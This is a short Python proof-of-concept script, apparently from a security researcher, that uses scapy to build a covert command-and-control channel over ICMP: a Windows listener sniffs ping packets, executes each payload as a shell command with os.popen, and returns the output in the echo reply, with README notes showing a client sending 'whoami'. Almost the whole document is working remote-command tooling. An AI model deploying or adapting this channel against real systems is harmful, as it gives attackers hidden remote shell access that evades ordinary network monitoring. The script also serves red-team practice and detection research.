#receiver windows
#!/usr/bin/python
import sys, os
from scapy.all import *

#showing interfaces in windows
"""
README/USAGE:
This is a simple PoC for sending basic C2 over ICMP echo/replies via 'bind' equivalent
The listener has been tuned to use Python 3.x udner Windows within 64 bit python default settings
Ensure that you do a 'pip install scapy' prior to using the script
Modify the sniff listener 'iface=' to be whichever interface you use
In windows, you can find this under show_interfaces() illustrated below:
>> show_interfaces()
INDEX  IFACE                                           IP               MAC
13     Intel(R) Dual Band Wireless-AC 8265             172.20.20.20     IntelCor:11:22:00

<Client Usage Example>:
Run scapy interactive (aka start > run > cmd.exe > scapy)
command = "whoami"
sendpkt = IP(src="10.10.10.10", dst="20.20.20.20")/ICMP(type=8)/Raw(load=command)
ans, unans = sr(sendpkt, timeout=2)
ans[0]

NOTE: Any expected return payload seems to not work well with multi-line returns.
Example findings with this base code:
whoami - returns in icmp response pkt
hostname - returns in icmp response pkt
ipconfig - Returns only a new line in response pkt and '\n' errors in the listening console screen
ping foo.com - Returns empty in response pkt with payload on the listening console screen


===============================================================================================
This software provides no expressed warranty or liability for use and is licensed under GPLv2
Dennis Chow dchow[AT]xtecsystems.com
www.scissecurity.com
===============================================================================================

"""

#Nested Function using Scapy to Parse Input and Respond
def shellfoo(pkt):
	#scapy uses pythons raw string vs. regular string
	if Raw in pkt[ICMP]:
		#keep original pkt values
		src = pkt[IP].src
		dst = pkt[IP].dst
		id = pkt[ICMP].id
		seq = pkt[ICMP].seq
		cmd = pkt[ICMP].payload
		#execute shell command nested function
		def shellcmd(input):
			#cheater way to strip out scapys raw string
			strcmd = str(cmd).replace('b\'', '').replace('\'', '').replace('\n', '')
			#return os.system(strcmd) (dont use only returns std out on console)
			return os.popen(strcmd).readline()
		retsh = shellcmd(cmd)	
		resp = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/Raw(load=retsh)
		send(resp)
#BPF filter for icmp only up to 10 packet count
sniff(iface="Intel(R) Dual Band Wireless-AC 8265", prn=shellfoo, filter="icmp", count=10)






